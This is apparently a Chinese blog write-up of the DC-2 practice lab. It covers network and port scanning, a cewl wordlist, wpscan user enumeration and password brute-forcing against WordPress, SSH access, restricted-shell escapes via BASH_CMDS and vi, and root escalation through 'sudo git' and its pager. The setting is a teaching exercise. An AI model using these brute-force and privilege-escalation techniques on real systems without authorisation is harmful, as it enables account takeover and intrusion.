---
link: https://blog.csdn.net/2403_88102829/article/details/154603420
title: dc系列——dc2
description: 其中etc目录中包含了几乎所有系统服务和程序的配置文件，hosts是本地域名解析文件，当浏览器拿到一个域名，会优先去本地查找域名解析，观察其对应ipvim编辑器添加映射补充：（cat /etc/passwd可查看用户列表）
keywords: dc系列——dc2
author: Le_ee 博客等级 码龄1年
date: 2025-11-27T04:20:06.027Z
categories:
  - 靶场复现
tags:
  - DC靶场
  - Linux
  - 提权
publisher: null
stats: paragraph=113 sentences=68, words=551
---
总结：

<meta name="referrer" content="no-referrer"/>

* 官网提示需要在靶机的host文件中添加靶机映射

```
vim /etc/hosts
```

其中etc目录中包含了几乎所有系统服务和程序的配置文件，hosts是本地域名解析文件，当浏览器拿到一个域名，会优先去本地查找域名解析，观察其对应ip

vim编辑器添加映射

![](https://i-blog.csdnimg.cn/direct/dd91d30ee8e144d6a3f0f405d6b7611f.png)

补充：（cat /etc/passwd可查看用户列表）

* **rbash与/bin/bash*

前者相当于试用版shell，受限更多，像一个小笼子，要想办法逃逸到/bin/bash，之后再进一步提权

学习一些常用的逃逸手段：

1：看"/"有没有被允许使用，允许直接用/bin/bash(注：本节尝试失败，限制图如下)

![](https://i-blog.csdnimg.cn/direct/e95221322e4643188eaabe12de4862f7.png)

2.BASH_CMDS环境变量逃逸（本节可用）

ps：关联数组就是用文字命名的数组

```
BASH_CMDS[a]='/bin/sh;a'
⬇
#BASH_CMDS 是 Bash 的一个关联数组，用于存储命令别名
#[a]='/bin/sh——创建一个叫a的命令，'/bin/sh;a' 是这个别名对应的值
#/bin/sh意思是启动一个shell
#;命令分隔符
#a再次执行a命令，，形成一个循环（此时以及在新的shell里面了）
⬇
#修复环境变量
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
#把一些位于 /bin/ 和 /usr/bin/ 目录的命令路径（如 ls, cat, whoami）添加到 PATH 中，系统才能找到这些命令
```

3：vi/vim编辑器逃逸（本节可用）

vi/vim 通常被允许在 rbash 环境中使用

```
vi/vim
#启动编译器
⬇
:set shell=/bin/sh
#:set：vi/vim 的设置命令
#shell=/bin/sh：告诉 vi/vim 当执行外部命令时，使用 /bin/sh 作为 shell，改变了 vi/vim 的默认 shell 解释器
⬇
:shell

#启动shell（/bin/sh）,这个新 shell 不继承 rbash 的限制
⬇
#修复环境变量，同前一种方法
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin/
```

* CMS

**CMS是一个可以通过浏览器进行管理的、功能完整的网站应用程序，就是一个建站系统，常用的有我们在dc1里遇见的drupal,还有wordpress，joomla**

**就是一个能帮助我们轻松建立网站的程序**

**我们之所以要识别这个CMS，是为了搞清楚在80端口上的那个网页是基于什么程序建立的，从而找到漏洞从这里去突破**

* **nikto**进行登录界面的url路径猜测(-h:目标主机)

```
nikto -h XX.XX.XX.XX
```

* cewl爬取这个网站生成自己的字典

```
cewl http://XX.XX.XX.XX -w pass.txt
```

* wpscan扫用户，匹配密码

```
wpscan --url http://dc-2 -U admin -P pass.txt
wpscan --url http://dc-2 -e u
```

* 命令补充

```
# less查看文件
less /etc/passwd
# 在less中的操作：
# - 空格键：向下翻页
# - b键：向上翻页  
# - /关键词：搜索
# - q键：退出 

#ls略;

#scp——文件传输
# 从本地复制到远程
scp file.txt user@remote:/path/

#vi文本编辑器
# 在vi中的基本操作：
# - i键：进入插入模式
# - Esc键：退出插入模式  
# - :wq：保存并退出
# - :q!：不保存退出
```

* git提权

```
sudo git -p help config
#git 以 root 权限 启动，调用分页器 less 来显示帮助文本
#因为 git 是 root，所以 less 也以 root 权限 运行
⬇
!/bin/bash
#! = 在分页器中执行外部命令的特殊前缀
#/bin/bash = 要启动的 shell
```

** 攻击流程： **

扫ip

![](https://i-blog.csdnimg.cn/direct/d013f7382e4c408d9e0bda3f5156ead2.png)

扫可疑ip

![](https://i-blog.csdnimg.cn/direct/ee723d03d3d449f0952a83c82d40f7bf.png)

看到常用端口80和7744开启，进一步侵略性扫描

![](https://i-blog.csdnimg.cn/direct/fdbe5808f24241c684294856b2cd520d.png)

分析得到的关键数据：

80端口对应着web渗透方向，并且我们可以看到这里对应的CMS是wordpress，版本是4.7.10

然后7744端口对应着ssh渗透，可以通过爆破和版本漏洞进行攻击

我们先尝试攻击80端口

输入dc-2登录网页，找到第一个flag入口

![](https://i-blog.csdnimg.cn/direct/b8101a931a0e4429bb8cabd8b2e0aa5e.png)

![](https://i-blog.csdnimg.cn/direct/4af5a19d780b4247ac321e903c1eff78.png)

translate：你惯用字典或许并不适用，所以不妨换一种方式，也许你需要用cewl。密码越多越好，但大部分时候你很难全部获得。 用一个身份登录以获得下一个flag， 如果没有，就用另一个身份登录。

提取有效信息：

1.一般字典不行

2.提到了cewl工具

3.需要几个账号密码去登录拿到下一个flag

所以我们下一步用cewl爬取这个网站生成自己的字典

```
cewl http://192.168.145.180 -w dc2password.txt
```

运行这个命令之后，ceWL会从首页开始爬这个网站所有可以访问链接，默认深度为2（也就是从指定的起始界面0+起始页面上能访问的直接链接1+一层间接链接2）

然后分析所有页面的文本内容，从中提取单词生成一个字典大纲，我们可以从这些包含网站信息的词里猜测密码

cat dc2password.txt发现爆出了很多敏感词汇![](https://i-blog.csdnimg.cn/direct/18b230c933484dc2ac5a49b870c91ed0.png)

然后使用工具wpscan

```
wpscan --url http://dc-2 -e u
```

--url指定要扫描的目标网站url，后面跟目标网站的网址

-e表示枚举，u是用户

看结果出来三个用户——admin,jerry,tom

![](https://i-blog.csdnimg.cn/direct/b39a85c4387045cdad470605ec1ea6aa.png)

继续用wpscan，加上我们之前扫出来的dc-2password字典逐个扫每一个用户名，看能不能找到对应密码

-u指定用户，-p是指定密码字典文件

```
wpscan --url http://dc-2 -U admin -P dc2password.txt
```

admin

![](https://i-blog.csdnimg.cn/direct/a1bcbd072ff2418299a8672d4f02ad54.png)

tom——successsed

![](https://i-blog.csdnimg.cn/direct/546b21db01f54c5b85013ebb1f01847f.png)

jerry——successed

![](https://i-blog.csdnimg.cn/direct/5cca2f243da845e6b99eb9fb23ad863a.png)

所以我们现在得到了两对账户密码，但是没有登录界面

用nikto进行登录界面的url路径猜测

-h 指定扫描的目标主机

```
nikto -h 192.168.145.180
```

![](https://i-blog.csdnimg.cn/direct/424b7f04e12043ddbac5503e6460b17c.png)

成功找到并且进入登录界面

![](https://i-blog.csdnimg.cn/direct/8657d293653549b884b7073fe787d8f9.png)先用tom登录，成功，但是进去什么也没找到，刚好对应上flag1（被预判了...）

所以用jerry试试..

在pages里找到了flag2

![](https://i-blog.csdnimg.cn/direct/ec0eb7437aa64fa58ff63258d1da4d65.png)

![](https://i-blog.csdnimg.cn/direct/d604001bafee4c1db170c012fd2de700.png)

translate:如果wordpress攻击不成功的话，还有另一条路，希望你能找到另一个攻击点

所以：尝试7744的ssh攻击

回到终端，用jerry链接显示permission denied

用tom连接成功

![](https://i-blog.csdnimg.cn/direct/44617671a1884564af0df797997a857d.png)

ls，找到flag3.txt➡cat

发现无法查看，被rbash（个人理解是只给用户提供最小权限的一个环境，会比一般shell限制的更多）限制了，所以下一步要从rbash里逃逸

先看看usr里面有什么，发现bin文件里有四个命令

![](https://i-blog.csdnimg.cn/direct/dd5bd3fc046e47e89a5e62520bbea670.png)

可能是能使用的命令，用less看一下flag3.txt试一试，成功

![](https://i-blog.csdnimg.cn/direct/69e165d61e5748418ff24bda1dbcfdf2.png)

translate：可怜的老tom总是追在jerry后面，他或许应该把承担的一切都su掉

提示我们用su命令把tom用户转成jerry用户，但是现在权限受制

用vi编辑器成功逃逸rbash

![](https://i-blog.csdnimg.cn/direct/03228bee0ffd45ebb40f219d7488516e.png)

ls之后发现flag4.txt

![](https://i-blog.csdnimg.cn/direct/9cefe393a87f404a9946b763d0a83362.png)

translate:夸夸你，但是no，hints...走吧...

无脑尝试先提权到root

先sudo -l看看我都被允许用管理员权限运行哪些

![](https://i-blog.csdnimg.cn/direct/bc54291c17694d7da8bd8e2d6b0cf8d1.png)

回显：jerry用户可以 **以root权限**运行git（版本控制系统）命令

```
sudo git -p help config
!/bin/bash
```

cd并且ls

发现final-flag.txt!

![](https://i-blog.csdnimg.cn/direct/6559a1a71f254386864645df7a9f4857.png)

❀❀❀完结撒花！！❀❀❀
